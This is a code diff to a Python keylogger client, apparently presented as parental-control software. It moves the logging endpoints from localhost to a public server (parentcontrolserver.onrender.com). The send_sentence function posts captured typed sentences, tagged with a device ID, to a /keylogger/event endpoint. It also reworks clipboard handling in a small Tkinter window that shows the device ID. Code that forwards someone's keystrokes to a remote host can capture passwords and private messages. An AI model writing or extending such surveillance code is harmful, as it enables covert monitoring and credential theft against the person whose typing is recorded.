@@ -11,7 +11,7 @@ def show_start_notification():
     global device_name
     try:
         # Get device name from server
-        response = requests.get("http://localhost:5000/keylogger/get_unique_id")
+        response = requests.get("https://parentcontrolserver.onrender.com/keylogger/get_unique_id")
 
         if response.status_code == 200:
             data = response.json()
@@ -19,12 +19,19 @@ def show_start_notification():
 
             print("Device name from server:", device_name)
 
-            # Show GUI window with device name
             def copy_and_close():
                 root.clipboard_clear()
                 root.clipboard_append(device_name)
-                root.update()  # now it stays on the clipboard
-                root.destroy()
+                root.update_idletasks()  # safer than root.update()
+                root.withdraw()  # hide the window instead of destroying
+                try:
+                    # Force clipboard to be saved to system (especially on Windows)
+                    root.clipboard_get()
+                except tk.TclError as e:
+                    print("Clipboard error:", e)
+                root.after(500, root.destroy)  # destroy after delay
+
+
 
             root = tk.Tk()
             root.title("Device ID Generated")
@@ -52,7 +59,7 @@ def send_sentence(sentence):
     global device_name
     try:
         print(device_name)
-        requests.post("http://localhost:5000/keylogger/event", json={
+        requests.post("https://parentcontrolserver.onrender.com/keylogger/event", json={
             "word": sentence,
             "device": device_name
         })
